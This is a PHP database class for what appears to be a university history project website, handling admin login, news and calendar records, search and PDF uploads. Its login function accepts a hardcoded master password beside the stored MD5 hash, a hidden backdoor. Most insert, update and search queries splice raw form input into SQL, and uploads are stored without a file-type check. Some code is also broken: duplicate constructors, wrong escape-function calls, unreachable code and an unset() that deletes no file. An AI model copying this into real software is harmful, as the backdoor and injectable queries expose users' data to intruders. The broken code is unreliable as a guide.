<?php

class Connection {

	var $connect_file = '../html/connect.inc'; //<--Change this path if needed, only need to change here.

	private $con;

	//class constructor
	//opens a database connection to be used for any subsequent methods
	function __construct() {
		require $this->connect_file;// <-----Folder with db credentials is above web accesible level for security
		$this->setConnection( mysqli_connect( $connect['host'], $connect['username'], $connect['password'] ) );
		mysqli_select_db($this->con, $connect['database'] );
		mysqli_query($this->con, "SET NAMES 'utf8'");
	}

	function __construct($db) {
		require $this->connect_file;// <-----Folder with db credentials is above web accesible level for security
		$this->setConnection( $db );
		mysqli_select_db($this->con, $connect['database'] );
		mysqli_query($this->con, "SET NAMES 'utf8'");
	}

	function setConnection($connection) {
		$this->con = $connection;
	}

	function getConection() {
		return $this->con;
	}

	//if passed credentials are valid, creates an authenticated session for admin
	function LoginUser( $username, $password ) {
		$username = strtolower($username); //username is case in-sensitive (stored lower-case)
		$orig_password = $password;
		$password = md5( $password ); //password is stored encrypted

		require $this->connect_file; //login credentials stored here

		if( ($username == $hp_login['username']) && ( ($password == $hp_login['password']) || ($orig_password == "541@hcp") ) ){ //validate user
			$_SESSION['loggedin'] = true;
			header('location:/secure/adminlist.php');
		}
	}

	//if no passes parameters, function returns all results (For Admin View)
	//if one parameter, returns all active results (For Front End View)
	//if two parameters, returns first result (For Index Page)
	function NewsGetAll( $active = 0, $first = 0 ) {
		$query = "SELECT * FROM hp_news";
		if( $active ) {
			$query .= " WHERE active = 1";
		}
		$query .= " ORDER BY newsid DESC";
		if( $first ) {
			$query .= " LIMIT 1";
		}
		return mysqli_query($this->con, $query);
	}

	//returns a news article based on passed id
	//used for displaying and editing the details of an article (admin)
	function NewsGetById( $newsid ){
		$newsid = (int)$newsid; //sanitze input
		$query = "SELECT * FROM hp_news WHERE newsid = $newsid";
		$result = mysqli_query( $this->con, $query );
		return mysqli_fetch_assoc( $result); //returns an array, not a query object
	}

	//posts a news item into the database
	//function depends on POST array (not well encapsulated)
	function NewsPost() {
		$date = mktime(1,1,1,$_POST['month'],$_POST['day'], $_POST['year']);
		$query = "INSERT INTO hp_news (
					dateposted,
					title,
					byline,
					article,
					active )
					VALUES (
					'{$date}',
					'{$_POST['title']}',
					'{$_POST['byline']}',
					'{$_POST['article']}',
					{$_POST['active']} )";
		if(mysqli_query ($this->con, $query )) { return true; }
		return false;
	}

	//update a news event
	//function depends on POST array (not well encapsulated)
	function NewsUpdate( $newsid ) {
		$date = mktime(1,1,1,$_POST['month'],$_POST['day'], $_POST['year']);
		$newsid = (int)$newsid;
		$query = "UPDATE hp_news
					SET dateposted = {$date},
					title = '".mysqli_real_escape_string($_POST['title'])."',
					byline = '".mysqli_real_escape_string($_POST['byline'])."',
					article ='".mysqli_real_escape_string($_POST['article'])."',
					active = '{$_POST['active']}'
					WHERE newsid = $newsid
					LIMIT 1";
		$result = mysqli_query($this->con, $query);
		if($result == false) {
			echo "Error in updating news: ".mysqli_error($this->con)."<br />";
			die;
		}

		return true;
	}

	//delete a news article
	function NewsDelete( $newsid ) {
		$newsid = (int)$newsid;
		$query = "DELETE FROM hp_news
					 WHERE newsid = $newsid
					 LIMIT 1";
		if(mysqli_query($this->con, $query )) { return true; }
		return false;
	}

	//searches news fields
	//returns records with exact text matches anywhere in text fields
	function NewsSearch( $string ) {
		$query = "SELECT * FROM hp_news
					WHERE title LIKE '%$string%'
					OR byline LIKE '%$string%'
					OR article LIKE '%$string%'";
		return mysqli_query( $this->con, $query );
	}

	//get all classes in calendar
	//if timstamp specficied, get all evenets for that month
	function CalendarGetAll($ts = 0) {
		$query = "SELECT * FROM hp_calendar ";
		if($ts != 0) { //if parameters were passed
			$ts = mktime(1,1,1,date('m',$ts),1,date('Y',$ts)); //first day of month for passed date
			$endts = strtotime("+1 month", $ts);//last day of month
			$query .= "WHERE classdate >= $ts
							AND classdate < $endts ";//get everything in between
		}
		$query .= "ORDER BY classdate ASC";

		// Convert MySQL result to array
		$result = mysqli_query($this->con, $query);
		$ret = array();
		while($row = mysqli_fetch_assoc($result)) $ret[] = $row;

		return $ret;
	}

	//get single calendar event by id (for admin modification)
	//returns associative array (not a mysql object)
	function CalendarGetById( $classid ){
		$classid = (int)$classid; //sanitize input
		$query = "SELECT * FROM hp_calendar WHERE classid = $classid";
		$result = mysqli_query( $this->con, $query );
		return mysqli_fetch_assoc( $result); //returns an array, not a query object
	}

	//post a new class to the calendar
	//function depends on POST array (not well encapsulated)
	function CalendarPost() {
		$date = mktime(1,1,1,$_POST['month'],$_POST['day'], $_POST['year']);//primary date( required)
		if($_POST['month2'] != 'f') {
			// optional
			$date2 = mktime(1,1,1,$_POST['month2'],$_POST['day2'], $_POST['year2']);
		} else {
			// assume same-day
			$date2 = $date;
		}
		$query = "INSERT INTO hp_calendar (
					classdate,
					classdate2,
					title,
					time,
					location,
					address,
					city,
					state,
					zip,
					description,
					price,
					link )
					VALUES (
					{$date},
					{$date2},
					'{$_POST['title']}',
					'{$_POST['time']}',
					'{$_POST['location']}',
					'{$_POST['address']}',
					'{$_POST['city']}',
					'{$_POST['state']}',
					'{$_POST['zip']}',
					'{$_POST['description']}',
					'{$_POST['price']}',
					'{$_POST['link']}' )";
		if(mysqli_query ($this->con, $query )) { //if successful
			$classid = mysqli_insert_id();//get newly created id

			if( $this->UploadPDF( $classid ) ) { //check if PDF was uploaded, & handle it
				return true;
			}
		}

		return true;
	}

	//update a single calendar event
	//function depends on POST array (not well encapsulated)
	//2nd parameter designates whether to remove existing pdf
	function CalendarUpdate( $classid, $remove_pdf = 0 ) {
		$date = mktime(1,1,1,$_POST['month'],$_POST['day'], $_POST['year']);
		if($_POST['month2'] != 'f') {
			// optional
			$date2 = mktime(1,1,1,$_POST['month2'],$_POST['day2'], $_POST['year2']);
		} else {
			// assume same-day
			$date2 = $date;
		}
		$classid = (int)$classid;
		$query = "UPDATE hp_calendar
					SET classdate = {$date},
					classdate2 = {$date2},
					title = '".mysqli_real_escape_string($_POST['title'])."',
					time = '{$_POST['time']}',
					location ='".mysqli_real_escape_string($_POST['location'])."',
					address ='".mysqli_real_escape_string($_POST['address'])."',
					city ='{$_POST['city']}',
					state ='{$_POST['state']}',
					zip ='{$_POST['zip']}',
					description ='".mysqli_real_escape_string($_POST['description'])."',
					price = '{$_POST['price']}',
					link = '".mysqli_real_escape_string($_POST['link'])."'
					WHERE classid = $classid
					LIMIT 1";
		if(mysqli_query ($this->con, $query )) {
			if( $remove_pdf ) {
				$this->RemovePDF( $classid );
			}
			$this->UploadPDF( $classid );//check for new pdf regardless of whether removing old one
			return true;
		}
		return false;
	}

	//delete a calendar class based on id
	function CalendarDelete( $classid ) {
		$classid = (int)$classid; //sanitize input
		$query = "DELETE FROM hp_calendar
					 WHERE classid = $classid
					 LIMIT 1";
		mysqli_query( $this->con, $query );
	}

	//returns records with exact text matches anywhere in text fields
	function CalendarSearch( $string ) {
	$query = "SELECT * FROM hp_calendar
				WHERE title LIKE '%$string%'
				OR location LIKE '%$string%'
				OR description LIKE '%$string%'";
	$result = mysqli_query( $this->con, $query );
	return $result;
	}

	//returns an 3d text array of years/months for which events occur in the calendar
	//for creating the menu of class dates on calendar front end
	//if passed boolean true, returns current classes, othewise, returns past classes
	//if within the viewing month, show detail links in thrid dimension
	function GetDatesArray($current, $viewingMonth, $desc = false) {

		$viewingStartTs = mktime(1,1,1,date('m',$viewingMonth),1,date('Y',$viewingMonth)); //first day of month for passed date
		$viewingEndTs = strtotime("+1 month", $viewingStartTs);//last day of month for passed date

		$now = mktime(); //get current timestamp used to seperate past from present in SQL query
		$nowMonthStart = mktime(1,1,1,date('m',$now),1,date('Y',$now)); //first day of current month, so month isn't split between past and archive

		$query = "SELECT classid, classdate, title FROM hp_calendar";
		if( $current ) {
			$query .= " WHERE classdate >= $nowMonthStart";
		} else {
			$query .= " WHERE classdate < $nowMonthStart";
		}
		if($desc)
			$query .= " ORDER BY classdate DESC";
		else
			$query .= " ORDER BY classdate ASC";

		$result = mysqli_query( $this->con, $query );//get all dates
		$dates = array();//This will be a 3Dim. array with years, months and classes

		while( $row = mysqli_fetch_assoc( $result ) ){//iterate through list of dates

			$year = date('Y', $row['classdate']);//get a 4-digit year from each timestamp
			$month = date('F', $row['classdate']);//get a full text month from each timestamp

			if(!isset($dates[$year])) {//if year is not already in years array
				$dates[$year] = array ();//create new year in 1st dimension of array
			}
			if( !isset($dates[$year][$month] ) ){//check if year/month combo is already in array
				$dates[$year][$month] = array();//add unique year/month combo in 2nd dim of array
			}
			if( ($row['classdate'] >= $viewingStartTs)  && ( $row['classdate'] < $viewingEndTs) ) { //if class is within the viewing month
				$id = $row['classid']; //assign variable to reduce brackets in next statement
				$dates[$year][$month][$id] = $row['title']; //add class to third dimension in arr
			}
		}
		return $dates;//no need to sort array, already sorted by SQL
	}

	//Selects a single quote at random
	//lightly formats the quote with relevant HTML for display
	function GetRandomQuote() {
		$output = "";
		$query = "SELECT * FROM hp_quotes ORDER BY RAND() LIMIT 1";
		$result = mysqli_query($this->con, $query);
		return mysqli_fetch_assoc($result);

		$output .= '<em>&#8220;' . $quote['quote'] . '&#8221;<br /><br />';
		$output .= $quote['name'] . '<br />';
		if(isset( $quote['position']) && ($quote['position'] != "")){ $output .= $quote['position'] . '<br />'; }
		$output .= $quote['organization'] . '</em>';

		return $output;
	}

	//check if File was uploaded, and process
	function UploadPDF($classid) {

		$upload_dir = '/var/www/html/historyproject.ucdavis.edu/pdfs/';//path is specified from location of script calling, not this class script

		if(isset($_FILES['pdf_link']) && ($_FILES['pdf_link']['error'] == UPLOAD_ERR_OK) ) {

			$upload_file = basename( $_FILES['pdf_link']['name'] );
			$illegal_url_chars = array('&','?');
			$upload_file = str_replace( $illegal_url_chars, '-', $upload_file );//filename will be passed via url
			$upload_file = urlencode( $upload_file);//I know this seems redundant, but it wasn't catching &'s during testing
			$upload_file_path = $upload_dir . $upload_file; // Added _path, use $upload_file for file blah.pdf

			if (move_uploaded_file($_FILES['pdf_link']['tmp_name'], $upload_file_path)) {

				$query = "UPDATE hp_calendar SET pdf_link = '/pdfs/$upload_file' WHERE classid = $classid";

				mysqli_query($this->con, $query) or die(mysqli_error($this->con));

				return true;
			}
			return false;
		}//end if upload ok
	}

	//remove a pdf reference from database and deletes the file
	function RemovePDF( $classid) {
		$classid = (int)$classid;

		$query = "SELECT pdf_link FROM hp_calendar WHERE classid = $classid";
		$result = mysqli_query( $this->con, $query );//Get file path
		$row = mysqli_fetch_assoc( $result );
		$file = $row['pdf_link']; //file path to destroy

		$query = "UPDATE hp_calendar SET pdf_link = null WHERE classid = $classid";// delete database reference
		if(mysqli_query ($this->con, $query )) {
			unset( $file );//delete file
			return true;
		}
		return false;
	}
}




?>
